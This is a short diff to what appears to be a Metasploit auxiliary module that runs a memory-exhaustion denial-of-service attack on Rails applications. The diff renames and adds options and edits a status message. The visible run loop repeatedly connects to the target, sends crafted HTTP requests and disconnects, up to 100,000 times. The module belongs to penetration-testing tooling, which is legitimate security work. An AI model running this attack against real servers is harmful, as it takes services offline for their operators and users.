@@ -38,10 +38,11 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(80),
-        OptString.new('URIPATH',    [true, 'The URI that routes to a Rails controller action', '/']),
-        OptInt.new('MAXSTRINGSIZE', [true, 'Max string size', 60000]),
-        OptInt.new('REQ_COUNT',     [true, 'Number of HTTP requests for each iteration', 500]),
-        OptInt.new('RLIMIT',        [true,  "Number of requests to send", 100000])
+        OptString.new('URIPATH',     [true, 'The URI that routes to a Rails controller action', '/']),
+        OptInt.new('MAXSTRINGSIZE',  [true, 'Max string size', 60000]),
+        OptInt.new('REQCOUNT',       [true, 'Number of HTTP requests to pipeline per connection', 1]),
+        OptInt.new('RLIMIT',         [true, 'Number of requests to send', 100000]),
+        OptInt.new('PROGRESS_TIMER', [true, 'Number of seconds between each progress update', 10])
       ],
     self.class)
   end
@@ -88,10 +89,10 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
     begin
-      print_status("Stressing the target memory, this will take a very long time...")
+      print_status("Stressing the target memory, this will take quite some time...")
       datastore['RLIMIT'].times { |i|
         connect
-        datastore['REQ_COUNT'].times { sock.put(http_request) }
+        datastore['REQCOUNT'].times { sock.put(http_request) }
         disconnect
       }
 
